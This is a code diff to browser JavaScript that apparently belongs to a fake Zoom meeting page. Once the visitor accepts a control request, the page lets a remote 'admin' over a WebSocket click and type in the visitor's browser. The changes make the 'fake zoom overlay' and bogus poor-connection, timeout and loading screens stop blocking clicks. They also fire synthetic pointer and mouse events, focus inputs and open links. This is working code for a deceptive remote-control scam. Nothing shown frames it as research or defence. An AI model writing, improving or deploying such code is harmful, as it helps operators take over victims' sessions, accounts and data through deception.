@@ -59,8 +59,12 @@ function connectWS() {
       if (accept) {
         controlGranted = true;
         ws.send(JSON.stringify({ type: "control-granted", target: "admin" }));
-        // NEW: Tell visitor control is on and disable overlay blocks
-        document.body.setAttribute("data-control", "active");
+        
+        // Make sure the fake zoom overlay doesn't block clicks
+        if (sessionOverlay) sessionOverlay.style.pointerEvents = "none";
+        if (poorConn) poorConn.style.pointerEvents = "none";
+        if (timeoutOverlay) timeoutOverlay.style.pointerEvents = "none";
+        if (loadingOverlay) loadingOverlay.style.pointerEvents = "none";
       } else {
         ws.send(JSON.stringify({ type: "control-denied", target: "admin" }));
       }
@@ -70,39 +74,38 @@ function connectWS() {
       const x = data.x * window.innerWidth;
       const y = data.y * window.innerHeight;
 
-      // NEW: Force the overlay out of the way so real clicks land
-      const overlay = document.elementFromPoint(x, y);
-      if (overlay) {
-        // If the topmost element is a known blocker (session/loading/poorConn), remove pointer events
-        if (overlay.closest("#sessionOverlay, #loadingOverlay, #poorConn, #timeoutOverlay")) {
-          const target = document.elementFromPoint(x, y);
-          if (target) {
-            target.style.pointerEvents = "auto";
-          }
-        }
-      }
-
-      // Find the actual underlying element
+      // 1. Find the real element under the click coordinates
       const el = document.elementFromPoint(x, y);
 
       if (el) {
+        // 2. Fire standard mouse events
         const eventInit = {
           bubbles: true,
           cancelable: true,
           view: window,
           clientX: x,
           clientY: y,
+          button: 0,
+          buttons: 1
         };
+        
+        el.dispatchEvent(new PointerEvent("pointerdown", eventInit));
         el.dispatchEvent(new MouseEvent("mousedown", eventInit));
+        
+        el.dispatchEvent(new PointerEvent("pointerup", eventInit));
         el.dispatchEvent(new MouseEvent("mouseup", eventInit));
+        
         el.dispatchEvent(new MouseEvent("click", eventInit));
-        
-        if (el.click) el.click();
-        
-        // Auto-focus inputs so typing lands there
-        if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
+
+        // 3. Handle typing/focus for inputs
+        if (el.tagName === "INPUT" || el.tagName === "TEXTAREA" || el.tagName === "SELECT") {
           el.focus();
-          el.setSelectionRange(el.value.length, el.value.length);
+          if (el.setSelectionRange) {
+             el.setSelectionRange(el.value.length, el.value.length);
+          }
+        } else if (el.closest("a")) {
+          // If they clicked a link, let it open in the tab
+          el.closest("a").click();
         }
       }
     }
